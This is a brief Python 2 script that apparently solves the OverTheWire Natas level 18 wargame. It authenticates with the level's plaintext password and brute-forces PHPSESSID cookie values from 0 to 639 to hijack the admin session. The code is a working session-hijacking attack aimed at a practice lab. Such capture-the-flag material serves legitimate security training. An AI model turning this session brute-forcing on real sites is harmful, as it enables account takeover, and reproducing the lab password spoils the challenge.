import httplib2
import urllib

website = httplib2.Http()
website.add_credentials("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

for id in range(640): #source code said maxid number is 640. This will iterate through every session ID number to see if it is the admin session.
	query = urllib.urlencode({'debug':'1', 'username':'admin'})
	resp, content = website.request("http://natas18.natas.labs.overthewire.org/index.php?" + query, method="POST", headers={'Cookie':'PHPSESSID=' +str(id)})
	if "You are an admin" in str(content):
		print str(content)
